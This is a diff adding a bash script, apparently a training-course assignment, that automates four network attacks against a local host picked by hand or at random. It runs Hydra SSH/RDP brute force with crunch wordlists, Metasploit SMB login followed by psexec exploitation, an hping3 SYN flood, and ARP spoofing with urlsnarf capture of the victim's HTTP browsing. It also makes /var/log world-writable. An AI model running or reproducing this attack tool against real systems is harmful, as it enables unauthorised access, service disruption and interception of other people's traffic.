@@ -1,0 +1,547 @@
+#!/bin/bash
+
+#1.1 create at least 3 different attacks using functions
+# Function to select Random
+assignRandomOption() {
+    options=("1" "2" "3" "4")  # Array of options
+    random_index=$(( RANDOM % 4 ))  # Generate a random index to the variable random_index either 1, 2, 3 or 4
+    userOption="${options[random_index]}"  # Assign the random value to $userOption
+	echo "$sgtime random option is now changed to option $userOption" >> /var/log/soclog.lst #log the random option has been changed
+}
+
+#====================================================================#
+
+# Function to perform Attack 1 (Hydra) - completed
+attack1() {
+    echo "Attack 1: HYDRA HAS BEEN SELECTED" #1.2 - DISPLAY OF ATTACK DESCRIPTION
+    # Add code for Attack 1 here
+    crunchy=$(which crunch) # Check directory of crunch
+    if [ -z "$crunchy" ]; then #check if there is data in variable crunchy
+        sudo apt-get -y install crunch #install crunch
+		echo "$sgtime install crunch now" >> /var/log/soclog.lst #log the random option has been changed
+    else
+        echo "crunch is installed at $crunchy"
+    fi
+	
+	#have the user to select A or B. A to select hydra using a username list and password list while B is using a single username & password
+    echo "Would you like to hydra using a username / password list or just single credentials."
+    echo "For List, select A, for single credentials, select B".
+    
+    while true; do
+    read -p "Enter 'A' or 'B': " attk1input
+    attk1input=$(echo "$attk1input" | tr '[:upper:]' '[:lower:]')  # Convert input to lowercase
+    
+	#check if user enters a or b. If not ask them keep re-entering
+    if [[ $attk1input == "a" || $attk1input == "b" ]]; then 
+        break
+    else
+        echo "Invalid input. Please enter 'A' or 'B'."
+    fi
+	done
+	
+	#=============================================================================
+	echo "You entered: $attk1input"
+    echo "$sgtime user input is $attk1input" >> /var/log/soclog.lst
+	
+    #==========Option A - Attacking using an username list and password list==========#
+    if [ $attk1input == a ]
+    then
+		#=====Generate Username File
+		echo "We will now generate a wordlist for usernames."
+		echo "Please enter some alphanumeric data to input, for example: abcdefghijklm124454"
+		read -r data
+		echo "$sgtime user enters the alphanumeric data $data for the username list." >> /var/log/soclog.lst
+		
+		while true; do
+		read -p "Enter a Minimum numerical digit: " minimuncharusername #inform user to input the mininum number of characters of the username file and store into variable minimumcharusername
+		echo "$sgtime user enters the characters $minimuncharusername for crunch required for the username list" >> /var/log/soclog.lst
+
+		# Check if username minimum character input is numerical, if it is not, then prompt the user until they input numerical figure
+			if [[ $minimuncharusername =~ ^[0-9]+$ ]]; then
+				echo "Valid numerical input: $input"
+				echo "$sgtime user enters the characters $minimuncharusername for crunch required for the username list" >> /var/log/soclog.lst
+				break
+			else
+				echo "Invalid input. Please enter a numerical digit."
+				echo "$sgtime user did not the valid minimum characters $minimuncharusername for crunch required for the username list" >> /var/log/soclog.lst
+			fi
+		done
+		
+		while true; do
+		read -p "Enter a Maximum numerical digit: " maximuncharusername #inform user to input the maximum number of characters of the username file and store into variable maximuncharusername
+		echo "$sgtime user enters the characters $maximuncharusername for crunch required for the username list" >> /var/log/soclog.lst
+		
+		# Check if username maximum character input is numerical, if it is not, then prompt the user until they input numerical figure
+			if [[ $maximuncharusername =~ ^[0-9]+$ ]]; then
+				echo "Valid numerical input: $input"
+				break
+			else
+				echo "Invalid input. Please enter a numerical digit."
+				echo "$sgtime user did not the valid maximum characters $maximuncharusername for crunch required for the username list" >> /var/log/soclog.lst
+			fi
+		done
+	 
+		crunch $minimuncharusername $maximuncharusername $data -o wordlist.txt
+		echo "$sgtime Generate the username file into wordlist.txt" >> /var/log/soclog.lst
+		
+		#=======Generate PW FIle=============
+		echo "We will now generate a wordlist for password."
+		echo "Please enter some alphanumeric data to input, for example: abcdefghijklm124454"
+		read -r pwdata
+		echo "$sgtime user enters the alphanumeric data $data for the password list." >> /var/log/soclog.lst
+		
+		while true; do
+		read -p "Enter a Minimum numerical digit: " minimuncharpw #inform user to input the minimum number of characters of the username file and store into variable minimuncharpw
+
+		# Check if password minimum character input is numerical, if it is not, then prompt the user until they input numerical figure
+			if [[ $minimuncharpw =~ ^[0-9]+$ ]]; then
+				echo "Valid numerical input: $input"
+				echo "$sgtime user enters the characters $minimuncharpw for crunch required for the password list" >> /var/log/soclog.lst
+				break
+			else
+				echo "Invalid input. Please enter a numerical digit."
+				echo "$sgtime user did not the valid minimum characters $minimuncharpw for crunch required for the password list" >> /var/log/soclog.lst
+			fi
+		done
+		
+		while true; do
+		read -p "Enter a Maximum numerical digit: " maximuncharpw
+
+		# Check if password maximum character input is numerical, if it is not, then prompt the user until they input numerical figure
+			if [[ $maximuncharpw =~ ^[0-9]+$ ]]; then
+				echo "Valid numerical input: $input"
+				echo "$sgtime user enters the characters $maximuncharpw for crunch required for the password list" >> /var/log/soclog.lst
+				break
+			else
+				echo "Invalid input. Please enter a numerical digit."
+				echo "$sgtime user did not the valid maximum characters $maximuncharpw for crunch required for the password list" >> /var/log/soclog.lst
+			fi
+		done
+	 
+		crunch $minimuncharpw $maximuncharpw $pwdata -o pw.txt
+		echo "$sgtime Generate the password file into pw.txt" >> /var/log/soclog.lst
+		
+		echo 'bruteforce ssh now'
+		hydra -L wordlist.txt -P pw.txt $ip_address ssh
+		echo "$sgtime hydra -L wordlist.txt -P pw.txt $ip_address ssh was run" >> /var/log/soclog.lst
+		echo 'bruteforce RDP now'
+		hydra -L wordlist.txt -P pw.txt $ip_address rdp
+		echo "$sgtime hydra -L wordlist.txt -P pw.txt $ip_address rdp was run" >> /var/log/soclog.lst
+		
+		rm pw.txt wordlist.txt
+		echo "$sgtime pw.txt and wordlist.txt are being removed" >> /var/log/soclog.lst
+		
+    
+    else
+    #==========Option B - Attacking using a single username and single password==========#
+		echo 'enter a username'
+		read attk1optionBusername
+		echo 'You have entered' $attk1optionBusername
+		echo "$sgtime user enter $attk1optionBusername" >> /var/log/soclog.lst
+		
+		echo 'enter a password'
+		read attk1optionBpassword
+		echo 'You have entered' $attk1optionBpassword
+		echo "$sgtime user enter $attk1optionBpassword" >> /var/log/soclog.lst
+		
+		echo 'bruteforce ssh now'
+		hydra -l $attk1optionBusername-p $attk1optionBpassword $ip_address ssh
+		echo "$sgtime hydra -l $attk1optionBusername-p $attk1optionBpassword $ip_address ssh was run" >> /var/log/soclog.lst
+		echo 'bruteforce RDP now'
+		hydra -l $attk1optionBusername -p $attk1optionBpassword $ip_address rdp
+		echo "$sgtime hydra -l $attk1optionBusername-p $attk1optionBpassword $ip_address rdp was run" >> /var/log/soclog.lst
+		
+		echo "hydra has completed"
+		echo "$sgtime hydra has stopped" >> /var/log/soclog.lst
+    fi
+}
+
+# Function to perform Attack 2
+
+
+attack2() {
+    echo "Attack 2: MSF CONSOLE HAS BEEN SELECTED" #1.2 - DISPLAY OF ATTACK DESCRIPTION
+    # Add code for Attack 2 here
+    echo 'enter a Username for SMB'
+	read useRname
+	echo $useRname >> user.txt
+	echo "$sgtime user enters $useRname and store into user.txt file" >> /var/log/soclog.lst
+
+	echo 'enter a Password for SMB'
+	read passWord
+	echo $passWord >> pass.txt
+	echo "$sgtime user enters $passWord and store into pass.txt file" >> /var/log/soclog.lst
+	
+	#create a new file called newsmb.rc in order to run the msfscript
+	echo 'use auxiliary/scanner/smb/smb_login' > newsmb.rc
+	echo "$sgtime use auxiliary/scanner/smb/smb_login was entered to the script newsmb.rc" >> /var/log/soclog.lst
+	echo 'set rhosts' $ip_address >> newsmb.rc
+	echo "$sgtime set rhosts' $ip_address entered to the script newsmb.rc" >> /var/log/soclog.lst
+	echo 'set set smbdomain mydomain.local' >> newsmb.rc
+	echo "$sgtime set set smbdomain mydomain.local entered to the script newsmb.rc" >> /var/log/soclog.lst
+	echo 'set pass_file pass.txt' >> newsmb.rc
+	echo "$sgtime set pass_file pass.txt entered to the script newsmb.rc" >> /var/log/soclog.lst
+	echo 'set user_file user.txt' >> newsmb.rc
+	echo "$sgtime set user_file user.txt entered to the script newsmb.rc" >> /var/log/soclog.lst
+	echo 'run' >> newsmb.rc
+	echo "$sgtime run entered to the script newsmb.rc" >> /var/log/soclog.lst
+	echo 'exit' >> newsmb.rc
+	echo "$sgtime exit entered to the script newsmb.rc" >> /var/log/soclog.lst
+	
+	msfconsole -qr newsmb.rc -o smbloginres.txt #log the attack of SMB login into the file smbloginres.txt
+	echo "$sgtime the script newsmb.rc was run and the attack details are stored into the file smbloginres.txt" >> /var/log/soclog.lst
+	cat smbloginres.txt #display the results of smbloginres attack
+	echo "$sgtime results of the attack smbloginres.txt were displayed" >> /var/log/soclog.lst
+	
+	anyloginsuccess=$(cat smbloginres.txt | grep Success | awk {'print $6'}) #check the log file of smbloginres.txt whether the Success word is inside, if does it will assign the word success to the variable otherwi variable will be empty. Because if the credentials the user supplied is valid, then it will have the word success inside smbloginres.txt
+	if [ -z $anyloginsuccess ]; #check if the variable is empty.
+	then
+		echo "the credentials supplied is not valid." #if empty that means user credential is invalid.
+	else
+		echo "We have managed to do a MSF SMB login to the targetted server, lets try to exploit and get password hash if possible"
+	#MSFconsole SMB fully attack command here if the variable anyloginsuccess is not empty and it should contains the word success. 
+	echo "$sgtime Full SMB attack begin as previous smbattack was successful" >> /var/log/soclog.lst
+	
+	echo 'use exploit/windows/smb/psexec' > smbfa.rc
+	echo "$sgtime use exploit/windows/smb/psexec entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'set rhosts' $ip_address >> smbfa.rc
+	echo "$sgtime set rhosts entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'set smbdomain mydomain.local' >> smbfa.rc
+	echo "$sgtime set rhosts entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'set smbpass' $passWord >> smbfa.rc
+	echo "$sgtime set smbpass $passWord entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'set smbuser' $useRname >> smbfa.rc
+	echo "$sgtime set smbuser $useRname entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'set smbshare newshare' >> smbfa.rc
+	echo "$sgtime set smbshare newshare entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'run' >> smbfa.rc
+	echo "$sgtime run entered to the script smbfa.rc" >> /var/log/soclog.lst
+	echo 'exit' >> smbfa.rc
+	echo "$sgtime exit entered to the script smbfa.rc" >> /var/log/soclog.lst
+	
+	msfconsole -qr smbfa.rc -o smbfullattack.txt #log the attack details into the file calledsmbfullattack.txt
+	echo "$sgtime the script smbfa.rc was run and the attack details are stored into the file smbloginres.txt" >> /var/log/soclog.lst
+	
+	cat smbfullattack.txt #display the results of the smb full attack.
+	echo "$sgtime results of the attack smbfullattack.txt were displayed" >> /var/log/soclog.lst
+	
+	fi
+	
+	rm smbloginres.txt smbfullattack.txt user.txt pass.txt newsmb.rc smbfa.rc
+	echo "$sgtime smbloginres.txt smbfullattack.txt user.txt pass.txt newsmb.rc smbfa.rc are removed from the system" >> /var/log/soclog.lst
+	}
+
+
+# Function to perform Attack 3
+attack3(){
+		echo "Attack 3: Hping3 HAS BEEN SELECTED" #1.2 - DISPLAY OF ATTACK DESCRIPTION
+		echo "The IP to attack is: " $ip_address
+		
+		echo "we will scan for open ports now " $ip_address 
+		nmap -vv $ip_address #do a port scanning of the IP address of open ports.
+		echo "$sgtime nmap -vv $ip_address was run" >> /var/log/soclog.lst 
+		
+		echo "Select a port to attack of the IP" $ip_address
+		read portattack
+		echo "$sgtime user enter the $portattack port number " >> /var/log/soclog.lst
+
+		#====prompts the user to enter the number of seconds of interval between each attack
+		while true; do
+			read -p "key in the number of seconds of interval between each attack" noOfSeconds #user enter the interval between each attack in seconds
+			echo "$sgtime user enters the numeric data of seconds of interval between each attack" >> /var/log/soclog.lst
+			
+			# Check if input is a valid number
+			if [[ $noOfSeconds =~ ^[0-9]+$ ]]; then
+				echo "You entered: "$noOfSeconds
+				break
+			else
+				echo "Invalid number. Please enter a number."
+				echo "user did not enter numeric data of seconds of interval between each attack and will need to re-enter again" >> /var/log/soclog.lst
+			fi
+		done
+
+		#====prompts the user to enter a data size between 0 and 65495
+		while true; do
+			read -p "Key in the data size between 0 and 65495" hping3datasize
+			echo "$sgtime user enters the numeric data of the size of to attack" >> /var/log/soclog.lst
+			
+			# Check if input is a valid number within the specified range
+			if [[ $hping3datasize =~ ^[0-9]+$ && $hping3datasize -ge 0 && $hping3datasize -le 65495 ]]; then
+				echo "You entered:" $hping3datasize
+				break
+			else
+				echo "Invalid data size. Please enter a number between 0 and 65495."
+				echo "$sgtime user did not enter numeric data of the size of to attack and will need to re-enter again" >> /var/log/soclog.lst
+			fi
+		done
+
+		#====prompts user to enter a spoofing IP address
+		while true; do
+			read -p "Please enter a spoofing IP address: " spoof_ip_address
+			echo "$sgtime user enters an ip address to spoof their attack" >> /var/log/soclog.lst
+			
+			# Check if the input is a valid IP address
+			if [[ $spoof_ip_address =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+				echo "You entered:" $spoof_ip_address
+				break
+			else
+				echo "Invalid Spoofing IP address. Please enter a valid IP address."
+				echo "$sgtime user did not enter a valid ip address and will need to re-enter again" >> /var/log/soclog.lst
+			fi
+		done
+
+		sudo hping3 -S $ip_address -p $portattack -c $noOfSeconds -d $hping3datasize
+		echo "$sgtime sudo hping3 -S $ip_address -p $portattack -c $noOfSeconds -d $hping3datasize command was entered and displayed to the user" >> /var/log/soclog.lst
+}
+
+
+# Function to perform Attack 4
+attack4(){
+	echo "Attack 4: ARPspoof HAS BEEN SELECTED" #1.2 - DISPLAY OF ATTACK DESCRIPTION
+	#function to check if dsniff is installed and to install if not installed
+	check_dsniff_installation() {
+	  if ! command -v arpspoof >/dev/null; then 
+		echo "dsniff package is not installed. Installing..."
+		sudo apt-get update
+		echo "$sgtime apt-get update was run" >> /var/log/soclog.lst
+		sudo apt-get install dsniff
+		echo "dsniff package has been installed."
+		echo "$sgtime dsniff package was installed" >> /var/log/soclog.lst
+	  else
+		echo "dsniff package is already installed."
+	  fi
+	}
+	 
+	check_dsniff_installation
+
+
+defaultoGateway=$(route -n | awk '/^0.0.0.0/ {print $2}')
+echo ' '
+echo 'Your selected IP address is: ' $ip_address
+echo 'default gateway in the network is' $defaultoGateway
+		if [ $ip_address == $defaultoGateway ]; #check if the ipaddress selected is the same as the default gateway
+			then
+			echo 'The IP address selected '$ip_address 'is the same as the Default Gateway' $defaultoGateway
+			echo 'We will try again to select another IP address: '
+			unset $ip_address
+			unset $defaultoGateway
+			echo "$sgtime IP address selected was the same as the default gateway and ARPspoof cannot run so the ARPSpoof will be re-run" >> /var/log/soclog.lst 
+			executeOrder66 #function defined below that will either random a selected IPaddress or have the user to select the IP address
+			attack4 #re-run attack 4 ARPspoof again after new ipaddress is selected by the user or randomed by the user.
+		else
+			# Enable IP forwarding
+			echo ' '
+			echo 'IP address selected and default gateway are different, we can begin attack'
+			echo 'ARPspoof begins now'
+			echo 1 > /proc/sys/net/ipv4/ip_forward
+			echo "$sgtime 1 > /proc/sys/net/ipv4/ip_forward was entered" >> /var/log/soclog.lst
+
+			# Define the target IP and gateway IP
+			TARGET_IP=$ip_address   # Replace with the target's IP address
+			GATEWAY_IP=$defaultoGateway    # Replace with the gateway's IP address
+
+			# Start ARP spoofing
+			arpspoof -t $GATEWAY_IP $TARGET_IP > /dev/null 2>&1 & #run ARPspoof in the background.
+			echo "$sgtime ARPspoof between gateway and target ip was run in the background"  >> /var/log/soclog.lst 
+			arpspoof -t $TARGET_IP $GATEWAY_IP > /dev/null 2>&1 & #run ARPspoof second session in the background.
+			echo "$sgtime Second ARPSpoof session between target ip and gateway was run the background" >> /var/log/soclog.lst 
+			urlsnarf -i eth0 > urlsnarf.txt 2>&1 & #run urlsnarf in the background to see what http traffic the user was surfing and store into urlsnarf.txt
+			echo "$sgtime urlsnarf was run in background and stored in the file urlsnarf.txt" >> /var/log/soclog.lst 
+
+			# Wait for a key press to stop the script
+			read -n 1 -s -r -p "Press any key to stop ARP spoofing..."
+			
+			# Stop ARP spoofing for target IP
+			killall arpspoof
+			killall urlsnarf
+			echo "$sgtime arpspoof and urlsnarf has been terminated by the user" >> /var/log/soclog.lst  
+
+			# Disable IP forwarding
+			echo 0 > /proc/sys/net/ipv4/ip_forward
+			echo "$sgtime 1 > /proc/sys/net/ipv4/ip_forward was disabled" >> /var/log/soclog.lst
+
+			sleep 2
+			echo ' '
+			echo 'all background processes have been stopped and ip forwarding have ended.'
+			echo 'displaying result of the victims activities.'
+			cat urlsnarf.txt
+			echo "$sgtime the results of Arpspoof and sniffing on the victim http traffic was displayed" >> /var/log/soclog.lst
+			
+			rm urlsnarf.txt
+			echo "$sgtime urlsnarf.txt was removed" >> /var/log/soclog.lst 
+		fi
+}
+
+#2.3 Function to choose a specific attack or random from the list
+chooseAttack() {
+    
+    choice=$userOption
+    case $choice in
+        1)
+            attack1
+            ;;
+        2)
+            attack2
+            ;;
+        3)
+            attack3
+            ;;
+			
+		4) 
+			attack4
+			;;
+        5)
+            assignRandomOption
+            echo 'your random option is now ' $userOption
+            chooseAttack
+            ;;
+        *)
+            echo "Invalid choice. Exiting..." #2.4 if the user enters a different key, display a message and exit
+            exit 1
+            ;;
+    esac
+}
+
+
+echo 'This script requires Admin privileges, press control + c to exit script and run in sudo if you have not done so'
+
+echo 'starting in 5 seconds'
+sleep 1
+echo 'starting in 4 seconds'
+sleep 1
+echo 'starting in 3 seconds'
+sleep 1
+echo 'starting in 2 seconds'
+sleep 1
+echo 'starting in 1 seconds'
+sleep 1
+echo 'start now!'
+
+sgtime=$(TZ=Asia/Singapore date)
+
+
+sudo chmod 777 /var/log #give yourself permission to /var/log folder
+echo "$sgtime chmod 777 /var/log" >> /var/log/soclog.lst #log the permission changes
+
+#2.1 Display all IP Addresses on the Network
+echo 'These are the following devices available in the network'
+
+arp -a #shows all devices in the network
+echo 'These are the following IP addresses available in the network'
+
+arp -a | awk '{print $2}' | sed 's/[()]//g' #runs ARP and show all IP addresses only
+echo "$sgtime arp -a" >> /var/log/soclog.lst #log the command arp -a
+
+echo ' '
+#2.2 Display all possible attacks with descriptions
+
+echo 'Choose an attack, select one of the following: 1, 2, 3, 4, 5'
+echo ' '
+echo '1) Hydra - this is a bruteforce technique, where we will intend to randomly generate a list of username & password and enter it into the targetted IP.'
+echo '2) MSFconsole - technique where the system will try to exploit a vulnerability on a Windows Machine where you will run a malicious payload on the target that will establish a connection with your Metasploit Handler.'
+echo '3) Hping3 - Hping3 is a popular network scanning and testing tool used by network administrators, security professionals, and hackers for various purposes. It is a command-line tool that allows users to send custom TCP/IP packets and analyze the responses. Hping3 can be used for network testing, firewall testing, port scanning, packet crafting, and other related tasks.'
+echo '4) ARPSpoof - Arpspoof, short for "Address Resolution Protocol (ARP) spoofing," is a technique used in computer networking to manipulate the communication between devices on a local area network (LAN). ARP is a protocol that maps an IP address to a physical MAC address on a network. By spoofing ARP messages, an attacker can trick devices on a LAN into associating their MAC address with a different IP address and sniff the traffic that is happening between the devices. In this case, only HTTP browsing can be sniff so if the victim access https website, no data will be captured.' 
+
+echo '5) A random option will be choose'
+echo ' '
+
+echo 'Please enter an option to begin'
+read userOption
+echo "$sgtime the user selected the option $userOption" >> /var/log/soclog.lst
+
+if [ $userOption == 1 ]
+	then
+	echo 'You have chosen the option of '$userOption
+	proceedScript='T'
+elif [ $userOption == 2 ]
+	then
+	echo 'You have chosen the option of '$userOption
+	proceedScript='T'
+elif [ $userOption == 3 ]
+	then
+	proceedScript='T'
+	echo 'You have chosen the option of '$userOption
+elif [ $userOption == 4 ]
+	then
+	proceedScript='T'
+	echo 'You have chosen the option of '$userOption
+elif [ $userOption == 5 ]
+	then
+	proceedScript='T'
+else
+	echo 'Invalid Option.' #inform user they have selected invalid option
+	echo "$sgtime the user selected an invalid option $userOption and the script has ended" >> /var/log/soclog.lst
+
+fi
+
+# Execute Order 66 - name of the function where it performs the choosing the IP address to attack and commencement of the attack
+
+executeOrder66(){
+if [ -z $proceedScript ]
+	then
+	echo 'The script has ended' #End Script Here
+	echo "$sgtime ending the script" >> /var/log/soclog.lst #log that the script has ended due to invalid selection by user
+else
+	
+
+				while true; do
+					#2.5 For each attack, allow the user to choose a target or random from the found IPs
+					echo "These are the following IP addresses : "
+					arp -a #shows all devices in the network
+					echo "$sgtime arp -a was run" >> /var/log/soclog.lst
+					
+				  read -p "Please choose an option (A or B), A is random IP address while B is you will enter an IP address of your choice." IPaddresschoice
+					echo "$sgtime user choose the choice of whether to random an ip address or choose from the list of arp " >> /var/log/soclog.lst
+					
+				  # Convert the input to uppercase for case-insensitive comparison
+				  IPaddresschoice=${IPaddresschoice^^}
+
+				  if [[ $IPaddresschoice == "A" ]]; then
+					# Option A: Randomly assigned number
+					# Run arp -a command and store the output
+					arp_output=$(arp -a)
+					# Extract the IP addresses from the arp output
+					ip_addresses=$(echo "$arp_output" | awk '{print $2}' | sed 's/[()]//g')
+					# Count the number of IP addresses
+					num_addresses=$(echo "$ip_addresses" | wc -l)
+					# Generate a random number between 1 and the number of IP addresses
+					random_index=$((1 + RANDOM % num_addresses))
+					# Get the IP address at the random index
+					ip_address=$(echo "$ip_addresses" | sed -n "${random_index}p")
+					echo "Option A: Randomly assigned number: $random_index"
+					sleep 1
+					echo "Option A: Randomly assigned ipaddress: $ip_address"
+					echo "$sgtime an IP address $ip_address in the network  was choosen by random as indicated by the user" >> /var/log/soclog.lst
+					
+					break
+				  elif [[ $IPaddresschoice == "B" ]]; then
+					# Option B: IP address
+					while true; do
+					  read -p "Option B: Please enter an IP address: " ip_address
+					echo "$sgtime user decided to pick an ip address themselves and input the ip address $ip_address" >> /var/log/soclog.lst
+					
+					  # Validate IP address format using regex pattern
+					  if [[ $ip_address =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+						echo "Valid IP address: $ip_address"
+						break
+					  else
+						echo "Invalid IP address format. Please try again."
+						echo "$sgtime user did not enter a valid ip address and will need re-enter again" >> /var/log/soclog.lst
+					  fi
+					done
+					break
+				  else
+					echo "Invalid option. Please choose either A or B."
+					echo "$sgtime user did not enter a valid option to choose an ipaddress and will need to re-enter A or B again" >> /var/log/soclog.lst 
+				  fi
+				done
+
+fi
+}
+executeOrder66
+
+echo ' '
+echo ' '
+sleep 1
+
+chooseAttack
